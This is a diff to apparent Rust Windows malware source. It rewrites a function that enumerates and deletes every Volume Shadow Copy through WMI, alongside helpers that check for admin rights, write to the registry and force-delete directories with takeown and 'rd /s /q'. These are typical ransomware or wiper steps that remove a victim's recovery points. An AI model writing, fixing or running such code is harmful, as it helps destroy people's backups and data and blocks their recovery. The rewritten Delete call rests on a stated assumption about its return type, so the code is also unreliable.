@@ -3,7 +3,7 @@ use std::io::{self, BufRead, BufReader, Write};
 use std::path::{Path, PathBuf};
 use std::collections::HashMap;
 use std::env;
-use wmi::{WMIConnection, COMLibrary};
+use wmi::{WMIConnection, COMLibrary, Variant};
 use windows::Win32::System::SystemInformation::GetOsSafeBootMode;
 use windows::Win32::Foundation::{BOOL, CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
 use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_WRITE};
@@ -26,6 +26,7 @@ use windows::Win32::Storage::FileSystem::{
     FILE_SHARE_WRITE, OPEN_EXISTING, GetDriveTypeW, GetLogicalDrives,
 };
 use windows::Win32::System::IO::DeviceIoControl;
+use serde::Deserialize;
 
 fn is_admin() -> bool {
     let output = Command::new("whoami")
@@ -614,6 +615,14 @@ fn add_takeown_and_delete(commands: &mut Vec<String>, directory: &str) {
     commands.push(format!(r#"rd /s /q {}"#, directory));
 }
 
+/// A Rust representation of the WMI Win32_ShadowCopy class.
+/// Only the fields you need (here, the ID) are defined.
+#[derive(Deserialize, Debug)]
+struct Win32ShadowCopy {
+    #[serde(rename = "ID")]
+    id: String,
+}
+
 /// Deletes all existing shadow copies on the system using WMI.
 fn delete_shadow_copies() -> wmi::WMIResult<()> {
     // Initialize COM and create a WMI connection.
@@ -626,18 +635,24 @@ fn delete_shadow_copies() -> wmi::WMIResult<()> {
 
     // Iterate over each shadow copy and delete it.
     for copy in shadow_copies {
-        if let Some(id) = copy.get("ID") {
-            // Convert the ID to a string and fix escape sequences.
-            let id_str = id.as_string()?.replace("\\\\", "\\");
-            // Construct the WMI object path for the shadow copy.
-            let query_object = format!("Win32_ShadowCopy.ID='{}'", id_str);
-            
+        if let Some(id_variant) = copy.get("ID") {
+            // Convert the ID to a string by matching on the Variant.
+            let id_str = match id_variant {
+                Variant::String(s) => s.clone().replace("\\\\", "\\"),  // Replace double backslashes if needed.
+                _ => {
+                    eprintln!("[-] The ID variant is not a string.");
+                    continue;
+                }
+            };
+
+            // Prepare the parameters for the Delete method.
             let mut params = HashMap::new();
             params.insert("Id".to_string(), Variant::String(id_str.clone()));
-
-            // Execute the deletion method.
-            wmi_con.exec_method(&query_object, "Delete", params)?;
-            println!("[+] Deleted Shadow Copy: {}", id_str);
+            
+            // Execute the Delete method on the Win32_ShadowCopy WMI class.
+            // Here we assume the method returns a u32 (the return code).
+            let result: u32 = wmi_con.exec_class_method::<Win32ShadowCopy, _, _>("Delete", params)?;
+            println!("[+] Deleted Shadow Copy: {} (result code: {})", id_str, result);
         }
     }
     
